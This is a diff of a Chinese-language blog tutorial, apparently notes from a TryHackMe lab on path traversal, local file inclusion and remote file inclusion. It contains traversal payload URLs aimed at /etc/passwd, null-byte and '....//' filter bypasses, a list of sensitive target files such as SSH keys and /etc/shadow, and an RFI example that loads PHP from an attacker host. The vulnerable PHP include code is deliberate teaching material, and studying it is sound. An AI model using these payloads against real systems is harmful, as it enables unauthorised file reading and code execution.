@@ -244,7 +244,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>7.9k</span>
+              <span>7.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -276,7 +276,7 @@
 <p>当用户的输入传递给PHP中的<code>file_get_contents</code>等函数时，会出现路径遍历漏洞。需要注意的是，函数并不是导致漏洞的主要因素。通常，输入验证或过滤不佳才是导致该漏洞的原因。在PHP中，您可以使用<code>file_get_contents</code>读取文件的内容。在<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.file-get-contents.php">这里</a>可以查看有关该函数的更多信息。</p>
 <p>下面的图片展示了web应用程序如何存储文件及其文件结构。用户可通过路径<code>/var/www/app/CVs</code>请求访问<code>userCV.pdf</code>文件的内容。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230101155922722.png" alt="image-20230101155922722"></p>
-<p>我们可以通过添加 <strong>payload</strong> 来查看web应用程序的行为用以测试URL参数。路径遍历攻击也称为<code>dot-dot-slash</code>攻击(<strong>..&#x2F;</strong>)，该攻击利用<code>../</code>将目录移动到<strong>上一级</strong>。如果攻击者找到了攻击点，在上图中是<code>get.php?file=</code>，<code>get.php</code>的路径为<code>/var/www/app/get.php</code>，然后攻击者可能发送如下内容：<code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>，通过<code>../</code>不断返回上一级直到根目录，再进入根目录下的<code>/etc</code>目录，找到<code>passwd</code>文件。因此web应用程序最终返回<code>passwd</code>的文件内容。</p>
+<p>我们可以通过添加 <strong>payload</strong> 来查看web应用程序的行为用以测试URL参数。路径遍历攻击也称为<code>dot-dot-slash</code>攻击(<strong>../</strong>)，该攻击利用<code>../</code>将目录移动到<strong>上一级</strong>。如果攻击者找到了攻击点，在上图中是<code>get.php?file=</code>，<code>get.php</code>的路径为<code>/var/www/app/get.php</code>，然后攻击者可能发送如下内容：<code>http://webapp.thm/get.php?file=../../../../etc/passwd</code>，通过<code>../</code>不断返回上一级直到根目录，再进入根目录下的<code>/etc</code>目录，找到<code>passwd</code>文件。因此web应用程序最终返回<code>passwd</code>的文件内容。</p>
 <p>同样，如果web应用程序在Windows服务器上运行，攻击者需要提供Windows路径。例如，如果攻击者想要读取<code>c:\boot.ini</code>中的<code>boot.ini</code>文件，那么攻击者可以根据目标Windows系统版本尝试以下操作：</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="http://webapp.thm/get.php?file=../../../../boot.ini">http://webapp.thm/get.php?file=../../../../boot.ini</a></p>
@@ -284,73 +284,75 @@
 <p><a target="_blank" rel="noopener" href="http://webapp.thm/get.php?file=../../../../windows/win.ini">http://webapp.thm/get.php?file=../../../../windows/win.ini</a></p>
 </blockquote>
 <p>下面是测试时的一些常见的操作系统文件：</p>
+<div class="table-container">
 <table>
 <thead>
 <tr>
-<th align="center"><strong>Location</strong></th>
-<th align="center"><strong>Description</strong></th>
+<th style="text-align:center"><strong>Location</strong></th>
+<th style="text-align:center"><strong>Description</strong></th>
 </tr>
 </thead>
-<tbody><tr>
-<td align="center">&#x2F;etc&#x2F;issue</td>
-<td align="center">contains a message or system identification to be printed before the login prompt.</td>
+<tbody>
+<tr>
+<td style="text-align:center">/etc/issue</td>
+<td style="text-align:center">contains a message or system identification to be printed before the login prompt.</td>
 </tr>
 <tr>
-<td align="center">&#x2F;etc&#x2F;profile</td>
-<td align="center">controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td>
+<td style="text-align:center">/etc/profile</td>
+<td style="text-align:center">controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived</td>
 </tr>
 <tr>
-<td align="center">&#x2F;proc&#x2F;version</td>
-<td align="center">specifies the version of the Linux kernel</td>
+<td style="text-align:center">/proc/version</td>
+<td style="text-align:center">specifies the version of the Linux kernel</td>
 </tr>
 <tr>
-<td align="center">&#x2F;etc&#x2F;passwd</td>
-<td align="center">has all registered user that has access to a system</td>
+<td style="text-align:center">/etc/passwd</td>
+<td style="text-align:center">has all registered user that has access to a system</td>
 </tr>
 <tr>
-<td align="center">&#x2F;etc&#x2F;shadow</td>
-<td align="center">contains information about the system’s users’ passwords</td>
+<td style="text-align:center">/etc/shadow</td>
+<td style="text-align:center">contains information about the system’s users’ passwords</td>
 </tr>
 <tr>
-<td align="center">&#x2F;root&#x2F;.bash_history</td>
-<td align="center">contains the history commands for root user</td>
+<td style="text-align:center">/root/.bash_history</td>
+<td style="text-align:center">contains the history commands for root user</td>
 </tr>
 <tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;dmessage</td>
-<td align="center">contains global system messages, including the messages that are logged during system startup</td>
+<td style="text-align:center">/var/log/dmessage</td>
+<td style="text-align:center">contains global system messages, including the messages that are logged during system startup</td>
 </tr>
 <tr>
-<td align="center">&#x2F;var&#x2F;mail&#x2F;root</td>
-<td align="center">all emails for root user</td>
+<td style="text-align:center">/var/mail/root</td>
+<td style="text-align:center">all emails for root user</td>
 </tr>
 <tr>
-<td align="center">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</td>
-<td align="center">Private SSH keys for a root or any known valid user on the server</td>
+<td style="text-align:center">/root/.ssh/id_rsa</td>
+<td style="text-align:center">Private SSH keys for a root or any known valid user on the server</td>
 </tr>
 <tr>
-<td align="center">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</td>
-<td align="center">the accessed requests for Apache webserver</td>
+<td style="text-align:center">/var/log/apache2/access.log</td>
+<td style="text-align:center">the accessed requests for Apache webserver</td>
 </tr>
 <tr>
-<td align="center">C:\boot.ini</td>
-<td align="center">contains the boot options for computers with BIOS firmware</td>
+<td style="text-align:center">C:\boot.ini</td>
+<td style="text-align:center">contains the boot options for computers with BIOS firmware</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
+</div>
 <h2 id="Local-File-Inclusion（LFI）"><a href="#Local-File-Inclusion（LFI）" class="headerlink" title="Local File Inclusion（LFI）"></a>Local File Inclusion（LFI）</h2><p>针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。在使用 PHP 时，使用 <code>include</code>、 <code>request</code>、 <code>include _ once</code> 和 <code>request _ once</code> 等函数常常会导致 Web 应用程序易受攻击。在使用其他语言（如ASP、JSP，甚至Node.js）时也会出现LFI漏洞。LFI漏洞利用遵循与路径遍历相同的概念。</p>
 <p>接下来将介绍不同的LFI场景。</p>
 <ol>
 <li><p>假设web应用程序提供两种语言，用户可以在<code>EN</code>和<code>AR</code>之间进行选择。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;lang&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">"lang"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 <p>上面的PHP代码通过URL参数 <code>lang</code> 使用 <code>GET</code> 请求来包含页面的文件。可以发送以下HTTP请求来完成调用：<code>http://webapp.thm/index.php?lang=EN.php</code>加载英文页面或<code>http://webapp.thm/index.php?lang=AR.php</code>加载阿拉伯语页面，其中 <code>EN.php</code> 和 <code>AR.php</code> 文件位于同一目录中。</p>
 <p>理论上，如果没有任何输入验证，我们可以通过上面的代码访问并显示服务器上的任何可读文件。假设我们想读取 <code>/etc/passwd</code> 文件，其中包含Linux操作系统用户的敏感信息，我们可以尝试以下操作：<code>http://webapp.thm/get.php?file=/etc/passwd</code></p>
 <p>在这种情况下，它之所以有效，是因为 <code>include</code> 函数中没有指定目录，也没有输入验证。</p>
 </li>
 <li><p>第二种情况，开发人员指定了函数中的目录。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&quot;languages/&quot;</span>. <span class="variable">$_GET</span>[<span class="string">&#x27;lang&#x27;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"languages/"</span>. <span class="variable">$_GET</span>[<span class="string">'lang'</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 <p>在上面的代码中，开发人员决定使用<code>include</code>函数通过 <code>lang</code> 参数调用 <code>language</code> 目录中的PHP页面。如果没有输入验证，攻击者可以通过将 <code>lang</code> 输入替换为其他OS敏感文件（如<code>/etc/passwd</code>）来操纵URL。此时，payload 看起来类似于<strong>路径遍历</strong>，但 <code>include</code> 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：</p>
-<p><code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
+<p><code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code> </p>
 </li>
 </ol>
 <p>下面介绍的是一些绕过<code>include</code>函数过滤的技巧。</p>
@@ -358,18 +360,18 @@
 <li><p>对于上面两种情况，我们检查了web应用程序的代码，所以我们知道如何利用它。而在本例中，我们将进行黑盒测试（无法得知源代码），在这种情况下，<strong>报错信息</strong>对于理解数据是如何在web应用程序中的传递和处理十分重要。</p>
 <p>在这种情况下，假设我们有该切入点：<code>http://webapp.thm/index.php?lang=EN</code>。如果我们输入无效的字段，例如<code>THM</code>，我们将得到如下错误：</p>
 <blockquote>
-<p>Warning: include(languages&#x2F;THM.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;THM-4&#x2F;index.php on line 12</p>
+<p>Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12</p>
 </blockquote>
 <p>该报错信息披露了重要信息，通过将<code>THM</code>作为输入，错误信息显示了<code>include</code>函数的相关内容：<code>include(languages/THM.php);</code>。</p>
 <p>仔细查看该目录，我们可以知道该函数包含了<code>languages</code>目录中的文件，并在输入的字符串结尾加上了<code>.php</code>。因此有效输入如下：<code>index.php?lang=EN</code>，其中文件<code>EN</code>在<code>languages</code>目录中，完整文件名为<code>EN.php</code>。此外，报错信息还披露了完整web应用程序目录路径的信息：<code>/var/www/html/THM-4/</code>（即<code>languages</code>目录所在路径）。</p>
 <p>我们可以利用<code>http://webapp.thm/index.php?lang=../../../../../etc/passwd</code>来查看敏感信息，我们需要使用 5个 <code>../</code> ，因为我们通过报错信息 已经知道当前路径有四级目录 <code>/var/www/html/THM-4</code>然后再加上之前提到的<code>languages</code>目录，所以一共有需要5个<code>../</code>但是仍然得到错误信息：</p>
 <blockquote>
-<p>Warning: include(languages&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;THM-4&#x2F;index.php on line 12</p>
+<p>Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12</p>
 </blockquote>
 <p>由上面的错误信息可知我们可以访问不同目录中的文件，但是<code>include</code>函数会在文件结尾加上<code>.php</code>，导致无法找到对应的文件。这告诉我们：开发人员指定了传递给<code>include</code>函数的文件类型（php）。为了绕过这种限制，我们可以使用<strong>NULL BYTE</strong>（即<code>%00</code>）。</p>
 <p>使用空字节是一种注入(injection)技术，通过在用户提供的数据添加 URL 编码<code>%00</code>或十六进制的<code>0x00</code>，以终止字符串。你可以将其视为试图欺骗Web应用程序无视空字节后发生的任何事情。</p>
 <p>通过在 payload 的结尾添加空字节，告诉<code>include</code>函数忽略空字节之后的内容，如下：</p>
-<p><code>include(&quot;languages/../../../../../etc/passwd%00&quot;).&quot;.php&quot;);</code> 相当于 <code>include(&quot;languages/../../../../../etc/passwd&quot;);</code></p>
+<p><code>include("languages/../../../../../etc/passwd%00").".php");</code> 相当于 <code>include("languages/../../../../../etc/passwd");</code></p>
 <p><strong>注意</strong>：<code>%00</code>技巧已修复，不适用于 PHP 5.3.4 及更高版本。</p>
 </li>
 <li><p>假设开发者决定过滤关键字以避免泄露敏感信息！正在被过滤的是<code>/etc/passwd</code>文件。此时，有两种可能的方法可以尝试绕过该过滤器：通过使用空字节 <code>%00</code> 或关键字<code>/.</code>。payload可以是<code>http://webapp.thm/index.php?lang=/etc/passwd/.</code>或<code>http://webapp.thm/index.php?lang=/etc/passwd%00</code>。</p>
@@ -379,7 +381,7 @@
 <li><p>假设开发人员通过过滤一些关键字来验证用户输入。假设我们输入的 payload 是：<code>http://webapp.thm/index.php?lang=../../../../etc/passwd</code></p>
 <p>得到的错误信息如下：</p>
 <blockquote>
-<p>Warning: include(languages&#x2F;etc&#x2F;passwd): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;THM-5&#x2F;index.php on line 15</p>
+<p>Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15</p>
 </blockquote>
 <p>由错误信息中的<code>include(languages/etc/passwd)</code>可知web应用程序将<code>../</code>过滤掉了，通过以下方式可以绕过验证：<code>....//....//....//....//....//etc/passwd</code>。</p>
 <p>绕过原理：PHP过滤器只匹配并消除它找到的第一个子集字符串<code>../</code>，然后不再过滤，如下图所示：</p>
@@ -398,14 +400,12 @@
 <p>外部服务器必须与目标web应用程序服务器进行通信，以成功实现RFI攻击，攻击者在他们自己的服务器(外部服务器)上托管恶意文件。然后，恶意文件通过HTTP请求注入到目标服务器的<code>include</code>函数中，使得恶意文件的内容在目标应用程序服务器上执行。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102101719466.png" alt="image-20230102101719466"></p>
 <p>如上图所示，攻击者在自己的服务器上托管了一个 PHP 文件：<code>http://attacker.thm/cmd.txt</code>。其中<code>cmd.txt</code>的内容如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">&quot;Hello THM&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP <span class="keyword">echo</span> <span class="string">"Hello THM"</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 <p>首先，攻击者注入了恶意的URL（指向攻击者服务器）：<code>http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt</code>。如果没有输入验证，那么恶意 URL 会被传递给<code>include</code>函数。接下来，web应用程序服务器会向攻击者服务器发送<code>GET</code>请求以获取目标文件。于是目标Web 应用程序会将远程文件包含到 <code>include</code> 函数中，在页面执行 PHP 文件，并将执行结果返回给攻击者。在该例子中，攻击者会在页面看见<code>Hello THM</code>消息。</p>
 <h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>首先介绍如何快速搭建一个http服务，使用 simpleHTTPserver 在几分钟内将您的桌面系统变成本地文件服务器。simpleHTTPserver 是一个 python 模块，可用于设置文件服务器或在 LAN 中即时提供目录。局域网中的任何人都可以立即访问您系统中的文件夹或文件。对于python 3.0及以上版本，运行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server [port]</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server [port]</span><br></pre></td></tr></tbody></table></figure>
 <p>下面开始进行实验：</p>
-<p>首先在攻击者服务器上新建一个 <code>cmd.txt</code> 文件，内容为：<code>&lt;?PHP echo &quot;Hello THM&quot;; ?&gt;</code>。然后就在当前目录下输入<code>python -m http.server</code>(端口默认为 8000)。</p>
+<p>首先在攻击者服务器上新建一个 <code>cmd.txt</code> 文件，内容为：<code>&lt;?PHP echo "Hello THM"; ?&gt;</code>。然后就在当前目录下输入<code>python -m http.server</code>(端口默认为 8000)。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104507593.png" alt="image-20230102104507593"></p>
 <p>然后在目标网站上输入 payload，实现 RFI 攻击。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230102104721781.png" alt="image-20230102104721781"></p>
@@ -592,12 +592,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">135k</span>
+    <span title="站点总字数">134k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:03</span>
+    <span title="站点阅读时长">2:02</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
